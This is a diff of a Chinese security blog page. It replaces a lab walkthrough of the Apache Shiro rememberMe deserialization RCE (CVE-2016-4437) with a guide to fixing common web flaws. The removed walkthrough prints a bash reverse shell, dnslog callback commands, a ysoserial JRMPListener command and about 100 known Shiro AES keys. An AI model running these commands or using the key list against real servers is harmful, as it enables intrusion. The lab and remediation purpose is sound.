@@ -6,26 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>漏洞复现-shiro反序列 | biubiubiu~blog</title>
+  <title>test1 | biubiubiu~blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="摘要Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–">
+  <meta name="description" content="摘要本文总结了常见漏洞的修复方法注：以下漏洞修复建议仅供参考，请根据漏洞实际情况对修复建议进行增删改。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="漏洞复现-shiro反序列">
-<meta property="og:url" content="http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/index.html">
+<meta property="og:title" content="test1">
+<meta property="og:url" content="http://yoursite.com/2021/05/29/test1/index.html">
 <meta property="og:site_name" content="biubiubiu~blog">
-<meta property="og:description" content="摘要Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–">
+<meta property="og:description" content="摘要本文总结了常见漏洞的修复方法注：以下漏洞修复建议仅供参考，请根据漏洞实际情况对修复建议进行增删改。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165632594.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165707739.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601170510156.png">
-<meta property="article:published_time" content="2020-06-01T07:20:25.000Z">
-<meta property="article:modified_time" content="2020-06-23T02:36:47.989Z">
+<meta property="article:published_time" content="2021-05-29T08:29:55.000Z">
+<meta property="article:modified_time" content="2021-03-19T04:32:27.124Z">
 <meta property="article:author" content="biubiubiu~blog">
-<meta property="article:tag" content="exp">
-<meta property="article:tag" content="shiro反序列">
+<meta property="article:tag" content="漏洞修复">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png">
   
     <link rel="alternative" href="/atom.xml" title="biubiubiu~blog" type="application/atom+xml">
   
@@ -151,20 +145,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-漏洞复现-shiro反序列" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-test1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      漏洞复现-shiro反序列
+      test1
     </h1>
   
 
         
-        <a href="/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" class="archive-article-date">
-  	<time datetime="2020-06-01T07:20:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
+        <a href="/2021/05/29/test1/" class="archive-article-date">
+  	<time datetime="2021-05-29T08:29:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-29</time>
 </a>
         
     
@@ -180,41 +174,249 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
-<p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本文总结了常见漏洞的修复方法<br>注：以下漏洞修复建议仅供参考，请根据漏洞实际情况对修复建议进行增删改。</p>
 <a id="more"></a>
 
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;= 1.2.4</p>
-<h3 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h3><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段</p>
-<p>fofa查询语句：app=”Apache-Shiro”</p>
-<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>vulhub拉漏洞镜像，使用方法参考<a href="https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437" target="_blank" rel="noopener">这里</a></p>
-<p>执行命令启动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>访问8080端口出现下图搭建成功</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png" alt="githubimage-20200601162616840"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用<a href="https://github.com/wyzxxz/shiro_rce" target="_blank" rel="noopener">EXP</a>，这里选择0</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165632594.png" alt="githubimage-20200601165632594"></p>
-<p>使用 <a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 监听</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165707739.png" alt="githubimage-20200601165707739"></p>
-<p>执行以下命令，在dnslog会收到响应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gt5uwt.dnslog.cn</span><br></pre></td></tr></table></figure>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">修改Web应用服务的软件部分，增加对客户端提交数据的合法性验证，至少严格过滤SQL语句中的关键字，并且所有验证都应该在服务器端实现，以防客户端（IE页面代码部分）控制被绕过。</span><br><span class="line">验证GET、POST、COOKIE等方法中URL后面跟的参数，需过滤的关键字为：</span><br><span class="line">[1] &#39;  单引号</span><br><span class="line">[2] &quot;  双引号</span><br><span class="line">[3] \&#39; 反斜杠单引号</span><br><span class="line">[4] \&quot; 反斜杠双引号</span><br><span class="line">[5] )  括号</span><br><span class="line">[6] ;  分号</span><br><span class="line">[7] -- 双减号</span><br><span class="line">[8] +  加号</span><br><span class="line">[9]SQL关键字，如select，delete，drop等等，注意对于关键字要对大小写都识别，如:select ;SELECT;seLEcT等都应识别</span><br><span class="line">建议降低Web应用访问使用较低权限的用户访问数据库。不要使用数据库管理员等高权限的用户访问数据库。</span><br></pre></td></tr></table></figure>
 
-<p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">这里</a>编码后使用，或在这个exp中使用以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;0.0.0.0&#x2F;18888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601170510156.png" alt="githubimage-20200601170510156"></p>
-<p>选择其他接口会提示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-] use gadget: JRMPClient</span><br><span class="line">[*] JRMPClient command example: xx.xx.xx.xx:8888</span><br><span class="line">[-] please enter command, enter q or quit to quit, enter back to re-choose gadget</span><br></pre></td></tr></table></figure>
 
-<p>需要在vps中放入<a href="https://github.com/angelwhu/ysoserial" target="_blank" rel="noopener">ysoserial.jar</a>反序列工具，执行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener3333 CommonsCollections5 &quot;ping 6vb1di.dnslog.cn&quot;</span><br></pre></td></tr></table></figure>
 
-<p>在exp中输入vps开启反序列工具后监听的端口，如果攻击成功vps会有相应的返回</p>
-<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>shiro反序列利用<a href="https://lalalaxiaoyuren.github.io/2020/04/20/shiro反序列化漏洞/" target="_blank" rel="noopener">https://lalalaxiaoyuren.github.io/2020/04/20/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
-<p>反序列延申</p>
-<p><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p>
-<h3 id="可以利用的KEY"><a href="#可以利用的KEY" class="headerlink" title="可以利用的KEY"></a>可以利用的KEY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;</span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;</span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;</span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br><span class="line">CrownKey&#x3D;&#x3D;a12d&#x2F;dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ&#x3D;&#x3D;</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE&#x3D;</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;</span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;</span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<h4 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h4><h5 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">建议过滤的关键字为：</span><br><span class="line">[1] &#39; 单引号</span><br><span class="line">[2] &quot; 双引号</span><br><span class="line">[3] &#x2F; 斜杠</span><br><span class="line">[4] \ 反斜杠</span><br><span class="line">[5] ) 括号</span><br><span class="line">[6] ; 分号</span><br><span class="line">[7] [ 中括号</span><br><span class="line">[8] &lt; 尖括号</span><br><span class="line">[9] &gt; 尖括号</span><br><span class="line">比如把&lt;编码为&lt;</span><br><span class="line">在cookie中加入httponly属性可以在一定程度上保护用户的cookie，减少出现XSS时损失。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="XML外部实体（XXE）注入"><a href="#XML外部实体（XXE）注入" class="headerlink" title="XML外部实体（XXE）注入"></a>XML外部实体（XXE）注入</h4><h5 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 对于PHP，常见的XML解析方法有：DOMDocument、SimpleXML、XMLReader，这三者都基于 libxml 库解析 XML，所以均受影响，xml_parse 函数则基于 expact 解析器，默认不载入外部 DTD ，不受影响。可以在php解析xml文件之前使用libxml_disable_entity_loader(true)来禁止加载外部实体（对上述三种 XML 解析组件都有效），并使用libxml_use_internal_errors()禁止报错；</span><br><span class="line">2. 对于Java，设置DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">   dbf.setExpandEntityReferences(false);</span><br><span class="line">3. 对用户的输入做过滤，如&lt;、&gt;、&#39;、&quot;、&amp;等</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="跨站点伪造请求（CSRF）"><a href="#跨站点伪造请求（CSRF）" class="headerlink" title="跨站点伪造请求（CSRF）"></a>跨站点伪造请求（CSRF）</h4><h5 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、检测HTTP header中的referer字段。服务器可以查看referer是否为自己的站点，如果不是，则拒绝服务。</span><br><span class="line">2、在重要请求中的每一个URL和所有的表单中添加token</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="服务器端请求伪造（SSRF）"><a href="#服务器端请求伪造（SSRF）" class="headerlink" title="服务器端请求伪造（SSRF）"></a>服务器端请求伪造（SSRF）</h4><h5 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</span><br><span class="line">2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</span><br><span class="line">3、限制请求的端口为http常用的端口，比如80,443,8080,8090。</span><br><span class="line">4、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;, gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;等引起的问题。</span><br><span class="line">5、过滤内网ip，限制访问内网</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">处理用户上传文件，要做以下检查：  </span><br><span class="line">1、 检查上传文件扩展名白名单，不属于白名单内，不允许上传。 </span><br><span class="line">2、 上传文件的目录必须是http请求无法直接访问到的。如果需要访问的，必须上传到其他（和web服务器不同的）域名下，并设置该目录为不解析jsp等脚本语言的目录。</span><br><span class="line">3、 上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义。</span><br><span class="line">4、 图片上传，要通过处理（缩略图、水印等），无异常后才能保存到服务器。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="任意文件下载或读取"><a href="#任意文件下载或读取" class="headerlink" title="任意文件下载或读取"></a>任意文件下载或读取</h4><h5 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、对path参数进行过滤，依次过滤“.”、“..”、“&#x2F;”、“\”等字符。</span><br><span class="line">2、或者对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时指定数据库中的id即可，id即对应的资源。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="svn-git源代码泄露"><a href="#svn-git源代码泄露" class="headerlink" title=".svn/.git源代码泄露"></a>.svn/.git源代码泄露</h4><h5 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、开发人员在使用Svn&#x2F;Git时，严格使用导出功能，禁止直接复制代码部署上线。</span><br><span class="line">2、在不影响代码运行的情况下，删除线上代码中所有目录下的 .svn&#x2F;.git 目录。</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><h5 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、对身份验证时传输的用户名密码等作加密处理，为了防止重放攻击可以在验证时加个随机数，以保证验证单次有效。</span><br><span class="line">2、关闭错误输出，防止调试信息泄露，或者当web应用程序出错时，统一返回一个错误页面或直接跳转至首页</span><br><span class="line">3、合理设置服务器端各种文件的访问权限</span><br><span class="line">4、尽量避免跨域的数据传输，对于同域的数据传输使用xmlhttp的方式作为数据获取的方式，依赖于javascript在浏览器域里的安全性保护数据。如果是跨域的数据传输，必须要对敏感的数据获取做权限认证，例如对referer的来源做限制，加入token等</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="任意目录遍历"><a href="#任意目录遍历" class="headerlink" title="任意目录遍历"></a>任意目录遍历</h4><h5 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对参数进行过滤，依次过滤“.”、“..”、“&#x2F;”、“\”等字符。</span><br></pre></td></tr></table></figure>
+
+
+
+
